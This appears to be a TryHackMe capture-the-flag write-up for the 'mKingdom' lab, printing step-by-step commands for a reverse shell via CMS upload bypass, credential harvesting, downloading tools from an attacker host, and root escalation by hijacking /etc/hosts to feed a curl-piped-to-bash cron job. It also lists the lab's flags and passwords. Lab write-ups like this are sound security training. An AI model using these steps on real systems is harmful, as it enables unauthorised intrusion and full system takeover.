#  mKingdom

> **Platform:** TryHackMe  
> **Difficulty:** Medium  
> **Category:** Web / CMS / RCE / Cron Job Abuse / DNS Hijacking  
> **Date Completed:** 2026-05-05  
> **Room Link:** [https://tryhackme.com/room/mkingdom](https://tryhackme.com/room/mkingdom)

---

##  Table of Contents

1. [Room Overview](#room-overview)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Lateral Movement](#lateral-movement)
6. [Privilege Escalation](#privilege-escalation)
7. [Flags](#flags)
8. [Key Takeaways](#key-takeaways)

---

##  Room Overview

A Mario-themed CTF built around a Concrete CMS installation running on a non-standard port. The attack chain involves finding the CMS admin panel, logging in with default credentials, bypassing file upload restrictions to deploy a PHP reverse shell, pivoting through three users (`www-data` → `toad` → `mario`), and finally escalating to root by hijacking a DNS entry to redirect a root-owned cron job to a malicious server.

**Goal:**  
Capture the user flag as mario and the root flag via cron job DNS hijacking.

**Skills Practiced:**  
Nmap, Gobuster (multi-stage), Concrete CMS file upload bypass, PHP reverse shell, config file credential harvesting, environment variable secrets, Base64 decoding, `pspy` process monitoring, `/etc/hosts` DNS hijacking, cron SUID exploitation.

---

##  Reconnaissance

### Network Scanning

```bash
nmap 10.49.151.100 -sV -v
```

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 85   | HTTP    | Apache httpd 2.4.7 (Ubuntu) |

Non-standard port — the web server runs on **port 85** instead of 80.

---

##  Enumeration

### Web Application

Visiting `http://10.49.151.100:85/` displays a taunting message:

> *"Bwa, ha, ha, pathetic, you'll never learn!"*

### Gobuster — Round 1

```bash
gobuster dir -u http://10.49.151.100:85/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50
```

**Found:** `/app/` (Status: 301)

### /app/ — The Castle

Navigating to `/app/` reveals a page with a "Jump" button, which redirects to:

```
http://10.49.151.100:85/app/castle/
```

### Gobuster — Round 2 (inside `/app/castle/`)

```bash
gobuster dir -u http://10.49.151.100:85/app/castle/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50
```

**Found:**

| Path | Status |
|------|--------|
| `/updates` | 301 |
| `/packages` | 301 |
| `/application` | 301 |
| `/concrete` | 301 |

The directory structure is consistent with **Concrete CMS**. A login button is visible at the bottom of the page.

### CMS Login

Testing common default credentials:

```
Username: admin
Password: password
```

Login successful. 

---

##  Exploitation

### Vulnerability

**Type:** Authenticated File Upload Bypass → RCE  
**Description:**  
Concrete CMS restricts file uploads to a whitelist of safe extensions. PHP files are blocked by default. However, the allowed file type list is editable from the admin dashboard — adding `php` to the whitelist allows uploading a PHP reverse shell directly.

---

### Steps

**Step 1 — Edit the allowed file types**

In the CMS admin panel, navigate to **System & Settings → Files → Allowed File Types** and append `php` to the existing list.

**Step 2 — Upload the PHP reverse shell**

Using the pentestmonkey PHP reverse shell, set the attacker IP and port, then upload via the CMS file manager.

**Step 3 — Start the listener**

```bash
nc -lvp 1234
```

**Step 4 — Trigger the shell**

Navigate to the uploaded file's URL. Shell received as `www-data`. 

```
uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(web)
```

**Step 5 — Upgrade to a full TTY**

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

##  Lateral Movement

### www-data → toad (via database.php)

Navigating the CMS filesystem to the config directory:

```bash
cd /var/www/html/app/castle/application/config
cat database.php
```

The file contains credentials for the `toad` user:

```
Password: toadisthebest
```

Switch to toad:

```bash
su toad
# Password: toadisthebest
```

### toad → mario (via environment variable)

Exploring toad's home directory reveals a `smb.txt` with a Mario-themed ASCII art. Running `env` to inspect the environment:

```bash
env
```

```
PWD_token=aWthVGVOVEFOdEVTCg==
```

The `PWD_token` variable contains a Base64-encoded value. Decode it:

```bash
echo 'aWthVGVOVEFOdEVTCg==' | base64 -d
# ikaTeNTANtES
```

**Mario's password: `ikaTeNTANtES`**

Switch to mario:

```bash
su mario
# Password: ikaTeNTANtES
```

### User Flag

```bash
cp ~/user.txt /tmp/user.txt
cat /tmp/user.txt
```

---

##  Privilege Escalation

### Process Monitoring with pspy

No sudo rights and no obvious SUID binaries. Using `pspy` to monitor for privileged processes:

```bash
# On attacker machine — host pspy
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O pspy
sudo python3 -m http.server 80

# On target — download and run
wget http://<ATTACKER_IP>/pspy -O /tmp/pspy
chmod u+x /tmp/pspy
/tmp/pspy > /tmp/pspy.txt &
cat /tmp/pspy.txt
killall pspy
```

**Cron job discovered (running as UID=0 / root):**

```bash
curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log
```

Root fetches `counter.sh` via `curl` using the hostname `mkingdom.thm` and pipes it directly into `bash`. This is the escalation vector.

### Attack Vector Analysis

| Vector | Viable? |
|--------|---------|
| Edit root crontab |  No access |
| Port forward on tcp/85 |  Privileged port |
| Overwrite `counter.sh` |  Not writable |
| PATH injection |  cron PATH is fixed |
| Replace `curl`/`bash`/`sh` |  Not writable |
| **Manipulate `/etc/hosts`** |  mario has write access |

### DNS Hijacking via /etc/hosts

`mario` can write to `/etc/hosts`. The hostname `mkingdom.thm` currently points to `127.0.1.1`. Redirecting it to the attacker's VPN IP causes the root cron job to fetch our counterfeit `counter.sh` instead.

**Step 1 — Backup and overwrite `/etc/hosts`**

```bash
cp /etc/hosts /tmp/hosts.bak

cat /etc/hosts | sed 's/127\.0\.1\.1\tmkingdom\.thm/<ATTACKER_IP>\t\tmkingdom.thm/g' > /tmp/replace_hosts

cat /tmp/replace_hosts > /etc/hosts
```

**Step 2 — Create the malicious `counter.sh`**

On the attacker machine, create the directory structure the cron job expects:

```bash
mkdir -p /tmp/app/castle/application
nano /tmp/app/castle/application/counter.sh
```

Contents:

```bash
#!/usr/bin/env bash
chmod 4755 /bin/bash
```

This sets the **SUID bit** on `/bin/bash`.

**Step 3 — Serve the malicious script**

```bash
sudo python3 -m http.server 85 --directory /tmp
```

Wait for the cron job to fire (within 1 minute). The server logs an HTTP 200 response — the cron job fetched and executed the script.

**Step 4 — Exploit the SUID bash**

```bash
/bin/bash -ip
```

```
euid=0
```

Root shell obtained. 

**Step 5 — Root Flag**

```bash
cat /root/root.txt
```

---

##  Flags

| Flag | Value |
|------|-------|
| User Flag | `thm{030a769febb1b3291da1375234b84283}` |
| Root Flag | `thm{e8b2f52d88b9930503cc16ef48775df0}` |

---

##  Key Takeaways

- **Non-standard ports are easy to miss.** The entire challenge lived on port 85 — a standard top-1000 Nmap scan catches it, but always verify the port range.
- **CMS file upload whitelists are only as strong as their admin panel's access control.** Default credentials (`admin:password`) gave us write access to the allowed extensions list — unlocking RCE in one step.
- **Config files often store plaintext credentials.** `database.php` handed over `toad`'s password without any encryption.
- **Environment variables are a covert credential store.** `PWD_token` in toad's env was Base64 — always run `env` after gaining a shell.
- **Write access to `/etc/hosts` = DNS hijacking.** If a privileged process resolves hostnames using `/etc/hosts` and you control that file, you control where that process connects. This is a subtle but powerful privilege escalation path.
- **`curl | bash` cron jobs are extremely dangerous.** Piping remote content directly into bash as root with no integrity check is a critical design flaw — any DNS or network manipulation turns it into a root shell.

---

##  Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port & service scanning |
| Gobuster | Multi-stage directory enumeration |
| Concrete CMS Admin Panel | File type whitelist modification |
| PHP Reverse Shell (pentestmonkey) | Initial RCE as www-data |
| Netcat | Reverse shell listener |
| `pspy` | Process monitoring to discover root cron job |
| `sed` + `/etc/hosts` | DNS hijacking to redirect cron's curl request |
| Python HTTP server | Serving the malicious `counter.sh` on port 85 |
| SUID `/bin/bash` | Privilege escalation to root |

---

##  References

- [pspy — Process Monitor](https://github.com/DominicBreuker/pspy)
- [GTFOBins — bash SUID](https://gtfobins.github.io/gtfobins/bash/#suid)
- [HackTricks — Cron Job Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-jobs)
- [PHP Reverse Shell — pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)

---

*Writeup by Avaneesh*
